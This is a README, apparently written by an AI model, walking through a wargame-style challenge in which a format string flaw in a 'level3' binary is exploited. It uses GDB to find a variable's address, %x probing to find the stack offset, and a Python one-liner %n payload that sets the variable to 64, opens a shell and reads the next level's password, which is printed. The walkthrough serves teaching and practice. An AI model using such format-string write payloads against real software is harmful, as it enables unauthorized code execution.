Here is a detailed README for exploiting `level3` using a format string vulnerability.

---

# Level3 Exploit

## Description

This guide explains how to exploit a format string vulnerability in the `level3` program. The goal is to set a specific variable to a value that will trigger the execution of a function which launches a shell.

## Prerequisites

- Access to the `level3` executable.
- Tools: GDB, Python.

## Exploitation Steps

### 1. Decompile the Binary

Use Ghidra or a similar tool to decompile the `level3` binary to understand its functionality.

### 2. Check Available Functions

Examine the available functions to identify any potential vulnerabilities:
- The `main` function calls a function `v`.
- The `v` function contains a call to `printf` without format string specifiers, making it vulnerable to format string attacks.
- The `v` function also uses an undeclared variable `m`. If `m` is set to `0x40` (64 in decimal), it will launch a shell.

### 3. Find the Variable Address

Use GDB to find the address of the variable `m`:

```bash
gdb level3
```

```gdb
info variables
```

Identify the address of `m`, for example: `0x0804988c`.

### 4. Set the Correct Value to the Variable

To set the value of `m` to `64`, use GDB:

```gdb
set *0x0804988c = 64
```

Verify the value:

```gdb
p *0x0804988c
```

You should see `0x40` (which equals 64). Continue the program:

```gdb
c
```

You should now have a shell:

```gdb
Continuing.
AAAA
AAAA
Wait what?!
[Attaching after process 173694 vfork to child process 173723]
[New inferior 2 (process 173723)]
[Detaching vfork parent process 173694 after child exec]
[Inferior 1 (process 173694) detached]
process 173723 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: Function "v" not defined.
[Attaching after process 173723 fork to child process 173724]
[New inferior 3 (process 173724)]
[Detaching after fork from parent process 173723]
[Inferior 2 (process 173723) detached]
process 173724 is executing new program: /usr/bin/dash
$ ls
```

However, because the SUID of the level binary can't be exploited in GDB, it runs as a normal user ID, so `level4/.pass` can't be read with this method.

### 5. Exploit the Format String Vulnerability

Exploit the format string vulnerability in `printf`:

#### Step 1: Determine the Offset

First, determine at which position `printf` starts to write the given string. Use this input string in GDB:

```bash
gdb level3
```

```gdb
run
```

```gdb
AAAAAAAAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
```

You should see output similar to:

```
AAAAAAAAAAA00000200.b7fd1ac0.b7ff37d0.41414141.41414141.25414141.2e783830.78383025.3830252e
```

Here, the value `41414141` (which corresponds to `AAAA` in ASCII) appears. We find that the `printf` argument position is at the 4th position.

#### Step 2: Create the Exploit

Now we have all the information to exploit the format string vulnerability:
- The address of `m` in little-endian format is `\x8c\x98\x04\x08`.
- We need to put the value `64` (0x40) in the 4th position of the stack preceding the `printf` call stack use.

Construct the input string using Python:

```bash
python -c 'print("\x8c\x98\x04\x08%60d%4$n")'
```

`%60d` will write 60 bytes on the standard output, and `%4$n` means to put the preceding content size (`%60d` (=60) + address string (4 length) = 64) at the fourth chunk before the `printf` stack use.

#### Step 3: Run the Exploit

Run the exploit, keeping `stdin` open:

```bash
(python -c 'print("\x8c\x98\x04\x08%60d%4$n")' ; cat) | ./level3
```

Once the shell is opened, you can execute commands:

```bash
cat /home/user/level4/.pass  
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

### Explanation

1. **Format String Vulnerability**: `printf` without format specifiers allows for unintended memory reads and writes.
2. **%n Specifier**: Used to write the number of bytes printed so far to an address specified on the stack.
3. **Offset Calculation**: Determining where the format string parameters are on the stack to correctly position the address of `m`.
4. **Exploit String**: Crafted to write the desired value (`64`) to the variable `m`.

## Conclusion

By following these steps, you have successfully exploited a format string vulnerability to gain shell access on `level3`. This technique uses knowledge of format string exploits and basic stack manipulation.

---

This README guides you through all the necessary steps to reproduce and understand the exploit.